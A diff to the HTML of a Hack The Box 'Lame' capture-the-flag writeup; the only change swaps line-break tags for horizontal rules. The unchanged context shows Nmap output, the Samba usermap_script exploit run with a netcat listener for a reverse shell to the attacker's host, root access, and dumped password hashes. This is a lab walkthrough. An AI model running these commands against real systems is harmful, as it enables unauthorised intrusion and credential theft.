@@ -26,7 +26,7 @@
           <p style="float:left;"><a href="/posts/20191101_htb-legacy.html"> « </a>📅 published on <code>01/Nov/2019</code><a href="/posts/20191101_htb-blue.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for HTB VM <a href="htps://www.hackthebox.eu/home/machines/profile/1">Lame</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_lame/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -34,7 +34,7 @@
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_htb_lame/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>139/tcp/netbios-ssn/Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_smb_usermap">exploit_smb_usermap</a>  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Fri Nov  1 12:30:13 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.lame/results/10.10.10.3/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.lame/results/10.10.10.3/scans/xml/_quick_tcp_nmap.xml 10.10.10.3
 Nmap scan report for 10.10.10.3
@@ -112,7 +112,7 @@ msfconsole
 139/tcp  |  netbios-ssn  |  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp  |  netbios-ssn  |  Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. From the Nmap scan results we know that the SMB service version is <code>3.0.20-Debian</code> and upon searching for this version we come across the popular <code>usermap_script</code> exploit. There's a <a href="https://github.com/amriunix/CVE-2007-2447">Python script</a> for this exploit on GitHub. We follow the exploit instructions and gain a shell with elevated privileges on the target system:  </p>
 <pre class="nested"><code>nc -nlvp 443
 python usermap_script.py 10.10.10.3 139 10.10.14.18 443
@@ -124,7 +124,7 @@ python usermap_script.py 10.10.10.3 139 10.10.14.18 443
 cat /root/root.txt
 </code></pre>
 <p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_lame/screenshot06.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>root@lame&gt; id
 uid=0(root) gid=0(root)
 root@lame&gt;  
@@ -147,7 +147,7 @@ root@lame&gt; users
 root
 makis
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested"><code>root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:............
 sys:$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.:17239:0...........
@@ -160,7 +160,7 @@ makis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:17239:............
 <pre class="nested"><code>/home/makis/user.txt: 69454a937d94f5f0225ea...........
 /root/root.txt: 92caac3be140ef409e4572..........
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.hackthebox.eu/home/machines/profile/1">https://www.hackthebox.eu/home/machines/profile/1</a>  </li>
 <li><a href="https://hackingresources.com/lame-hackthebox-walkthrough/">https://hackingresources.com/lame-hackthebox-walkthrough/</a>  </li>
